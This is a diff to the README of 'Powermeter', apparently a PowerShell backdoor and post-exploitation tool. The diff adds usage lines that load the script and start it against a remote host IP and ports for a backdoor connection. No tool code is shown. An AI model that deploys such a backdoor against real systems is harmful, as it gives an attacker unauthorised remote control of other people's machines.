@@ -2,6 +2,11 @@
 Powermeter is a basic powershell based backdoor/post exploit tool. Main functionalities are shown below. You can check the video at the bottom of the page.
 Note: It is highly recommended to watch the video at 1080p due to low quality. It will be fixed soon :=)
 
+## How to run?
+
+	>> PS C:\Users\decoder\Desktop> . .\powermeter.ps1
+	>> PS C:\Users\decoder\Desktop> Start-Powermeter -SHOST 192.168.214.1 -SPORT 9190 -FLPORT 9192
+
 In main module:
 
 Powermeter>show options
